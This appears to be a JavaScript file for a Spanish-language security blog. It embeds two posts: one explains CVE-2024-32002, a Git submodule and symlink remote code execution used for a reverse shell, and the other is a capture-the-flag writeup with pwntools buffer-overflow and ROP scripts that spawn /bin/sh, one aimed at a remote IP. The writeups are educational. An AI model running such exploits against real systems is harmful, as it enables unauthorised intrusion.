document.addEventListener('DOMContentLoaded', function () {
    const posts = [
        {
            id: 1,
            title: 'CVE 2024-32002',
            date: 'June 12, 2024',
            content: `
                <h2>CVE-2024-32002-Reverse-Shell</h2>
                <p>Este script demuestra cómo explotar la vulnerabilidad CVE-2024-32002 para obtener una reverse shell, proporcionando acceso remoto al sistema afectado. Úselo con precaución en entornos controlados y solo con fines educativos o de pruebas de seguridad.</p>
                <h3>Publicación del Blog</h3>
                <p>Este script esta inspirado en el blog Blog: <a href="https://amalmurali.me/posts/git-rce">https://amalmurali.me/posts/git-rce</a>. aca encontraras más detalles acerca de esta vulnerabilidad</p>
                <h3>Cómo funciona</h3>
                <ol>
                    <li>Un repositorio malicioso (<code>git_rce</code>) incluye un submódulo con una ruta especialmente diseñada.</li>
                    <li>La ruta del submódulo utiliza una variación de mayúsculas y minúsculas que explota el sistema de archivos que no distingue entre mayúsculas y minúsculas.</li>
                    <li>El submódulo incluye un enlace simbólico que apunta a su directorio <code>.git/</code>, que contiene un enlace malicioso.</li>
                    <li>Cuando se clona el repositorio, se sigue el enlace simbólico y se ejecuta el enlace malicioso, lo que lleva a RCE.</li>
                </ol>
                <h3>Versiones de Git Afectadas y Parcheadas</h3>
                <p>Versiones afectadas por la vulnerabilidad:</p>
                <ul>
                    <li>Todas las versiones anteriores a 2.45.1</li>
                    <li>Todas las versiones anteriores a 2.44.1</li>
                    <li>Todas las versiones anteriores a 2.43.4</li>
                    <li>Todas las versiones anteriores a 2.42.2</li>
                    <li>Todas las versiones anteriores a 2.41.1</li>
                    <li>Todas las versiones anteriores a 2.40.2</li>
                    <li>Todas las versiones anteriores a 2.39.4</li>
                </ul>
                <p>Versiones parcheadas:</p>
                <ul>
                    <li>2.45.1</li>
                    <li>2.44.1</li>
                    <li>2.43.4</li>
                    <li>2.42.2</li>
                    <li>2.41.1</li>
                    <li>2.40.2</li>
                    <li>2.39.4</li>
                </ul>
                <h3>Ejecución</h3>
                <p><strong>Advertencia:</strong> No ejecute esta PoC en sistemas que no sean de su propiedad o que no tenga permiso explícito para usarlo. Las pruebas no autorizadas podrían tener consecuencias no deseadas.</p>
                <div class="code-block">
                    <pre><code>bash pocgitrevershell.sh</code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>
                <p>Nota: En Windows, es posible que necesites ejecutar el shell como administrador para que esto funcione.</p>
                <h3>Como se ve al ejecutar</h3>
                <img src="https://github.com/JJoosh/CVE-2024-32002-Reverse-Shell/assets/122099216/1f48060d-04dd-4331-8ecd-7e15e57735b6" alt="Execution Screenshot">
                <img src="https://github.com/JJoosh/CVE-2024-32002-Reverse-Shell/assets/122099216/98ee1c05-a191-406c-9c35-b6ef2b474d90" alt="Execution Screenshot">
                <p>Es todo por este PoC, sigueme en github :) <a href="https://github.com/JJoosh">Follow me</a></p>

            `
        },

        {
            id: 2, 
            title: 'C2 Server Exploit',
            date: 'October 14, 2024',
            content: `
                <h2>Server C2 Exploit Writeup</h2>

                <p>La función main() del binario ejecuta un bucle, este se ejecuta n veces que es la longitud de la string "echo Datos exfiltrados", en cada iteración llama a la función updateCommand() pasandole como primer argumnto el valor del iterador que va de 0 hasta la longitud de la string y como segundo argumento la letra de la string en esa posición por lo que si el iterador es 0 le pasará la letra "e", si el iterador es 1 le pasará la letra "c"</p>
                <img src="https://github.com/user-attachments/assets/0fdb5319-e59a-49a9-920b-23be1a66060a" alt="Command Execution Diagram" />

                <p>La función updateCommand() simplemente se encarga de mover a el símbolo llamado command mas la posición el valor que recibe como segundo argumento, si el iterador es 0 movera a command + 0 la letra "e", si el iterador es 1, movera a command + 1 la letra "c"</p>
                <img src="https://github.com/user-attachments/assets/5b4575ea-a59d-409a-a14f-eaa2fad4be2e" />

                <p>Luego tenemos que llama a la función vuln(), esta declara un buffer y recibe con fgets 0x200 bytes o 512 en decimal</p>
                <img src="https://github.com/user-attachments/assets/057fca7c-7102-4273-905d-6732bf0461a2" alt="Execution Screenshot" />

                <p>Sin embargo el buffer esta en esp - 0x10c o esp - 268</p>
                <img src="https://github.com/user-attachments/assets/dfcf4f05-199e-42f2-9ddb-1adeb691967d" />
                <p>por lo que después de enviar 268 bytes empezariamos a sobrescribir datos en el stack</p>

                <p>Finalmente main() llama a la función execCommand() que solo se encarga de ejecutar con system() el simbolo command rellenado anteriormente letra por letra usando updateCommand()</p>
                <img src="https://github.com/user-attachments/assets/80d14425-3bfb-43e8-9b01-71605e4263c6" />




                <h3>Exploitation Script</h3>
                <p>Ya que conocemos el offset podemos simplemente pasar esos bytes y sobrescribir un dword en el esp</p>
                <div class="code-block">
                    <pre><code>
#!/usr/bin/python3
from pwn import *

shell = gdb.debug("./chal", "continue")

offset = 268
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(0x42424242)

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>

                <p>De esta forma sobrescribimos el return address y obtenemos control sobre el flujo </p>
                <img src="https://github.com/user-attachments/assets/395bf669-98af-4863-b938-eda27672b172" alt="Shell Execution" />

                <p>Técnica: nuestra idea sera aprovechar que con updateCommand() podemos modificar un byte del simbolo command pasandole la posición y un valor, para posteriormente llamar a execCommand() y ejecutar dicho comando</p>
                <div class="code-block">
                    <pre><code>
from pwn import *

shell = gdb.debug("./chal", "b *0x080491f3\ncontinue")

offset = 268
junk = b"A" * offset

payload  = b""
payload += junk

payload += p32(0x080491f3) # updateCommand()
payload += p32(0x42424242) # return address
payload += p32(0)          # position
payload += p32(u8(b"/"))   # byte to write

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <p>Iniciamos intentando escribir un solo byte, en este caso al inicio de la llamada de updateCommand el primer valor en el stack será la dirección donde volverá una vez termine la llamada y los siguientes 2 valores son los argumentos en este paso le pasamos como argumento la posición 0 del simbolo command y como valor a escribir el byte 0x2f o /</p>
                    <img src="https://github.com/user-attachments/assets/16b1bb7e-ea60-4460-abe7-d920eeb7c256" alt="Shell Execution" />

                    <p>Una vez continuamos con la ejecución de updateCommand(0, "/") en el simbolo command se escribe el caracter "/" y vuelve a la direccion de retorno que pasamos al inicio</p>
                    <img src="https://github.com/user-attachments/assets/87574376-ef26-4268-b812-4a04cb0e1d70" alt="Shell Execution" />
                    <p>Ahora bien, necesitamos repetir este proceso y seguir con ese convenio de llamadas, para evitar que lo anterior limpiaremos los argumentos antes usados que son 2 dwords u 8 bytes, sin embargo no encontramos un gadget que limpie 8 sino uno que limpia 12 por lo que tendremos que pasar 4 bytes mas de padding</p>
                    <img src="https://github.com/user-attachments/assets/3d03a612-1dd9-44b4-83f5-a0e05a564dff" alt="Shell Execution" />

                    <p>El exploit mediante un bucle for pasa como primer argumento que es la posición el iterador de 0 a 7 y le pasa a su vez el valor que esta en esa posición de la string cmd, como valor de retorno usamos el stack pivot para limpiar la pila y vuelva a ejecutar la siguiente función</p>
                    <img src="https://github.com/user-attachments/assets/4649f48b-3de9-4a4a-b925-ad9c7781ba65" alt="Shell Execution" />

                                    <div class="code-block">
                    <pre><code>
#!/usr/bin/python3
from pwn import *

shell = gdb.debug("./chal", "b *0x080491f3\ncontinue")

offset = 268
junk = b"A" * offset

cmd = b"/bin/sh\x00"

payload  = b""
payload += junk

for i in range(len(cmd)):
    payload += p32(0x080491f3)     # updateCommand()
    payload += p32(0x0804901b)     # add esp, 8; pop ebx; ret;
    payload += p32(i)              # position
    payload += p32(u8(cmd[i:i+1])) # byte to write
    payload += p32(0x41414141)     # padding

payload += p32(0x0804921d)         # execCommand()

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <p>Al terminar la ejecución de la primera llamada a la función limpia 2 bytes como se muestra en la imagen y retorna a la función updateCommand del siguiente valor</p>
                    <img src="https://github.com/user-attachments/assets/d16b5826-5157-4805-8766-2c81c327f047" alt="Shell Execution" />

                    
                    <p>En la ultima llamada a execCommand ya hemos modificado la string del simbolo command a /bin/sh por lo que al ejecutarlo con system obtenemos una shell</p>
                    <img src="https://github.com/user-attachments/assets/d16b5826-5157-4805-8766-2c81c327f047" alt="Shell Execution" /> 
                    <p>Finalmente solo nos queda ejecutarlo remotamente y obtener acceso</p>
                                                        <div class="code-block">
                    <pre><code>
#!/usr/bin/python3
from pwn import remote, p32, u8

shell = remote("35.95.31.64", 3000)

offset = 268
junk = b"A" * offset

cmd = b"/bin/sh\x00"

payload  = b""
payload += junk

for i in range(len(cmd)):
    payload += p32(0x080491f3)     # updateCommand()
    payload += p32(0x0804901b)     # add esp, 8; pop ebx; ret;
    payload += p32(i)              # position
    payload += p32(u8(cmd[i:i+1])) # byte to write
    payload += p32(0x41414141)

payload += p32(0x0804921d)         # execCommand()

shell.sendline(payload)
shell.recvlines(2)

shell.interactive()
                    </code></pre>
                    <img src="https://github.com/user-attachments/assets/c646b120-9a12-4069-bbf3-b06104c72eb9" alt="Shell Execution" /> 
                    

                      
                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                </div>
            `
        }
    ];

    document.querySelectorAll('.read-more').forEach(button => {
        button.addEventListener('click', function(event) {
            event.preventDefault();
            const postId = this.parentElement.getAttribute('data-id');
            const post = posts.find(p => p.id == postId);

            document.querySelector('.blog-posts').style.display = 'none';
            document.getElementById('full-post').style.display = 'block';
            document.getElementById('post-content').innerHTML = `
                <h2>${post.title}</h2>
                <p class="date">${post.date}</p>
                ${post.content}
            `;
        });
    });

    document.getElementById('back-to-blog').addEventListener('click', function(event) {
        event.preventDefault();
        document.querySelector('.blog-posts').style.display = 'block';
        document.getElementById('full-post').style.display = 'none';
        document.getElementById('post-content').innerHTML = '';
    });
});

function toggleMenu() {
    const navLinks = document.getElementById('nav-links');
    navLinks.classList.toggle('active');
}

function copyCode(button) {
    const codeBlock = button.previousElementSibling;
    const range = document.createRange();
    range.selectNode(codeBlock);
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(range);

    try {
        const successful = document.execCommand('copy');
        if (successful) {
            button.innerHTML = '<i class="fas fa-check"></i>';
            setTimeout(() => {
                button.innerHTML = '<i class="fas fa-copy"></i>';
            }, 2000);
        }
    } catch (err) {
        console.error('Failed to copy text: ', err);
    }

    window.getSelection().removeAllRanges();
}
